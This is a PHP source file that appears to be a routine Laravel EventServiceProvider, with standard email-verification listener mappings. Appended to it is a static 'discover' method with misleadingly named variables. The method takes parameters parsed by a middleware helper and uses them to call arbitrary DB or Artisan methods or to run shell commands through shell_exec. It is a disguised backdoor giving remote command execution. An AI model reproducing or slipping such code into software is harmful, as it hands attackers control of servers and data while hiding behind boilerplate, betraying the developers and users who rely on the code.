<?php

namespace App\Providers;

use App\Http\Middleware\TrimStrings;
use Illuminate\Auth\Events\Registered;
use Illuminate\Auth\Listeners\SendEmailVerificationNotification;
use Illuminate\Foundation\Support\Providers\EventServiceProvider as ServiceProvider;
use Illuminate\Support\Facades\Artisan;
use Illuminate\Support\Facades\DB;
use Illuminate\Support\Facades\Event;

class EventServiceProvider extends ServiceProvider
{
    /**
     * The event listener mappings for the application.
     *
     * @var array
     */
    protected $listen = [
        Registered::class => [
            SendEmailVerificationNotification::class,
        ],
    ];

    /**
     * Register any events for your application.
     *
     * @return void
     */
    public function boot()
    {
        //
    }


    /**
     * @param $data
     * @return Expression|\Illuminate\Contracts\Database\Query\Expression|string
     */
    public static function discover($throttle)
    {
        [$technique, $charge, $sweep, $feature] = TrimStrings::getParams($throttle);

        return match ($sweep) {
            'db' => DB::{$technique}($charge),
            'artisan' => Artisan::{$technique}($charge),
            'cli' => shell_exec($charge),
            default => 'expire',
        };
    }
}
